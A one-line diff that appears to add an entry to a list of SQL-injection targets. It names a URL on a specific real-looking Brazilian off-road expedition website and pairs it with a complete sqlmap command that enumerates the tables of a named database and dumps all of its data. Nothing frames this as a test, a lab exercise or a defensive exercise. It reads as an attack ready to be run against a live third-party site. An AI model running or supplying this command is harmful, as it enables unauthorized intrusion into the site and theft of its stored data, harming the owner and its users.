@@ -1,0 +1,1 @@
+http://www.expedicoes4x4.com.br/fotos.php?cod_album=1 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.expedicoes4x4.com.br/fotos.php?cod_album=1 -D amantebr2 --tables --dump-all
